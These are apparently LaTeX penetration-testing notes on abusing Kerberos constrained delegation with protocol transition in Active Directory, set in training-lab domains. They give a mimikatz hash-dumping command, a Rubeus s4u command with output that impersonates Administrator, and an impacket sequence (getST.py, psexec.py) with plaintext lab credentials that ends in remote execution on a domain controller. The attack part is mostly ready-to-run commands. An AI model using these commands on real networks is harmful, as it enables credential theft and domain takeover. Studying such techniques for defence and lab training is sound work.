\section{Constrained Delegation}
\begin{itemize}
    \item 
        A compromised account with constaned delegation allow to delegate the authentication to {\bf any service} offered by the account in the authorized list.
    \item
        If this constrained delegation allows {\bf protocol transition}, we can pretend to be {\bf anyone}, arbitrarily, to authenticate against these services without waiting for anyone's authentication
\end{itemize}



getting hashes:
\begin{verbatim}
mimikatz.exe privilege::debug sekurlsa::msv exit
\end{verbatim}

\subsection{CD with protocol transition attack}


\subsubsection{On windows}
\begin{verbatim}
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF 
    /domain:eagle.local /impersonateuser:Administrator 
    /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt


[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
[*] Building AS-REQ (w/ preauth) for: 'eagle.local\webservice'
[+] TGT request successful!
[*] base64(ticket.kirbi):
...SNIP...
[*] Action: S4U

[*] Using domain controller: dc1.eagle.local (172.16.18.3)
[*] Building S4U2self request for: 'webservice@EAGLE.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'webservice@EAGLE.LOCAL'
[*] base64(ticket.kirbi):
...SNIP...
[*] Impersonating user 'Administrator' to target SPN 'http/dc1'
[*] Using domain controller: dc1.eagle.local (172.16.18.3)
[*] Building S4U2proxy request for service: 'http/dc1'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/dc1':
...SNIP...
\end{verbatim}

\subsubsection{From Linux}

\begin{verbatim}
# echo '10.129.205.35 dc01.inlanefreight.local inlanefreight.local' | sudo \
    tee -a /etc/hosts
# enum with impacket 
findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine

#
$ getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' \
    -impersonate Administrator
$ export KRB5CCNAME=./Administrator.ccache
$ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
\end{verbatim}


\subsetion{Links}


\begin{itemize}
    \item 
        \url{https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#constrained-delegation}
    \item 
        \url{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation}
\end{itemize}
